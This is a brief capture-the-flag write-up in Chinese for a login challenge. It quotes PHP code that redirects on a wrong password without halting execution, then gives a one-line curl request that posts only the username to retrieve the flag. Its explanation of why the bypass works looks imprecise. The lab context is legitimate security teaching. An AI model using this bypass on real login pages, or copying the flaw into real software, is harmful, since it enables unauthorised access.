admin 4
===

```php
if($_POST['name'] === 'admin') {
    if($_POST['password'] !== $password) {
        // show failed message if you input wrong password
        header('Location: ./?failed=1');
    }
}

if($_POST['name'] === 'admin'): /* login success! */ ?>
    <div class="alert alert-success"><code><?=$flag?></code></div>
```

本頁面有判斷密碼機制，但如上方關鍵代碼所示，使用 POST 方法送出 name 與 password 兩個參數，但不送 password 即可繞過上方的 `if($_POST['password'] !== $password)` 判斷。

```bash
curl -d "name=admin" https://hackme.inndy.tw/login4/
```

## 授權聲明
[![copyright © 2019 By MksYi](https://img.shields.io/badge/copyright%20©-%202019%20By%20MksYi-blue.svg)](https://mks.tw/)
[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)